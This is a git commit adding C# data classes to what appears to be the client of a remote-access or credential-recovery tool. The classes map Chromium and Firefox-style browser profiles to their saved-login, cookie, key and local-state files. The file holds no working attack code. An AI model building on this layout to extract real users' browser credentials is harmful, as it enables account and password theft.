d1e5b9d116728bc4f52b48bf897151a6b8c2853b
Capo <62123196+aran1910@users.noreply.github.com>
2025-10-19 15:42:57 -0400

    Add files via upload

---
+++ Pulsar.Client/Recovery/Browsers/Structs.cs
@@ -0,0 +1,33 @@
+﻿namespace Pulsar.Client.Recovery.Browsers
+{
+    public class AllBrowsers
+    {
+        public BrowserChromium[] Chromium { get; set; }
+        public BrowserGecko[] Gecko { get; set; }
+    }
+
+    public class BrowserChromium
+    {
+        public string Name { get; set; }
+        public string Path { get; set; }
+        public string LocalState { get; set; }
+        public ProfileChromium[] Profiles { get; set; }
+    }
+
+    public class ProfileChromium
+    {
+        public string Name { get; set; }
+        public string LoginData { get; set; }
+        public string Cookies { get; set; }
+        public string Path { get; set; }
+    }
+
+    public class BrowserGecko
+    {
+        public string Name { get; set; }
+        public string Path { get; set; }
+        public string Key4 { get; set; }
+        public string Logins { get; set; }
+        public string ProfilesDir { get; set; }
+    }
+}
